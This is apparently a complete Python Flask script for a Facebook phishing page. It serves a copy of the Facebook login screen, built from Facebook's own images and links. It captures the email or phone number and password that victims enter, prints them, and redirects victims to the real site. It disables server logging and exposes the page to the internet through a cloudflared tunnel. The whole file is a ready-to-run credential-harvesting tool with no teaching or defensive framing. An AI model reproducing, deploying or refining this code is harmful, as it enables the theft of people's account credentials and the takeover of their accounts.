import os
import logging
import threading
import subprocess

from flask import Flask, request, redirect

log = logging.getLogger("werkzeug")
log.disabled = True

app = Flask(__name__)


@app.route("/")
def home():

    name = request.args.get("name")
    password = request.args.get("password")

    print(f"name: {name}")
    print(f"password: {password}")

    if name and password:
        return redirect("https://www.facebook.com/")

    return """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>

        body{
            margin:0;
            padding:0;
            overflow-x:hidden;
            user-select:none;
            font-family:Arial;
            background:white;
        }

        #nazwa{
            position:absolute;
            top:27%;
            left:69%;

            border-radius:15px;
            border:0.5px solid lightgray;

            height:6vh;
            width:28vw;
            max-width:512px;

            padding-left:15px;

            font-size:1rem;
        }

        #haslo{
            position:absolute;
            top:35%;
            left:69%;

            border-radius:15px;
            border:0.5px solid lightgray;

            height:6vh;
            width:28vw;
            max-width:512px;

            padding-left:15px;

            font-size:1rem;
        }

        #przycisk{
            position:absolute;
            top:45%;
            left:69%;

            border-radius:50px;
            border:none;

            height:6vh;
            width:28vw;
            max-width:512px;

            background-color:blue;
            color:white;

            font-size:1rem;

            cursor:pointer;
        }

        #napis{
            position:absolute;

            top:20%;
            left:69%;

            font-size:1.1rem;
            color:black;
        }

        #napis2{
            position:absolute;

            top:52%;
            left:79%;

            font-size:0.9rem;
            color:blue;
        }

        #przycisk2{
            position:absolute;

            top:60%;
            left:69%;

            border-radius:50px;
            border:0.5px solid blue;

            height:6vh;
            width:28vw;
            max-width:512px;

            background-color:white;
            color:blue;

            font-size:1rem;

            cursor:pointer;
        }

        #linia{
            position:absolute;

            left:65%;
            top:0;

            height:100vh;
            width:1px;

            background-color:lightgray;
        }

        #tlo{
            position:absolute;

            left:20%;
            top:10%;

            width:32vw;
            height:70vh;

            background-image:url("https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp");

            background-position:center;
            background-repeat:no-repeat;
            background-size:contain;
        }

        #tlo2{
            position:absolute;

            left:2%;
            top:5%;

            width: 100px;
            height: 80px;

            min-width:200px;

            background-image:url("https://www.saintprix.fr/wp-content/uploads/2024/08/Facebook-logo.png");

            background-position:left top;
            background-repeat:no-repeat;

            background-size:contain;
        }

        #napis3{
            position:absolute;

            left:5%;
            top:70%;

            width:300px;

            font-size:3rem;
        }

        #napis4{
            color:blue;
        }

        @media(max-width:900px){

            #nazwa,
            #haslo,
            #przycisk,
            #przycisk2{

                left:10%;
                width:80%;
                max-width:none;
            }

            #napis{
                left:10%;
                top:15%;
            }

            #napis2{
                left:35%;
            }

            #linia{
                display:none;
            }

            #tlo{
                display:none;
            }

            #tlo2{
                display:none;
            }

            #napis3{
                display:none;
            }
        }

    </style>
</head>

<body>

    <form>

        <input
            type="text"
            name="name"
            id="nazwa"
            placeholder="Email or phone number"
        >

        <input
            type="password"
            name="password"
            id="haslo"
            placeholder="Password"
        >

        <input
            type="submit"
            value="Log in"
            id="przycisk"
        >

    </form>

    <h1 id="napis">
        Log into Facebook
    </h1>

    <a href="https://www.facebook.com/login/identify/">

        <h1 id="napis2">
            Forgot password?
        </h1>

    </a>

    <a href="https://www.facebook.com/reg/">

        <input
            type="button"
            id="przycisk2"
            value="Create new account"
        >

    </a>

    <div id="linia"></div>

    <div id="tlo"></div>

    <div id="tlo2"></div>

    <div id="napis3">

        <b>Explore the things</b>

        <div id="napis4">

            <b>you love</b>

        </div>

    </div>

</body>
</html>
    """


def start_cloudflared():

    subprocess.Popen([
        "cloudflared",
        "tunnel",
        "--url",
        "http://localhost:5000"
    ])


threading.Thread(target=start_cloudflared).start()

app.run(host="0.0.0.0", port=5000)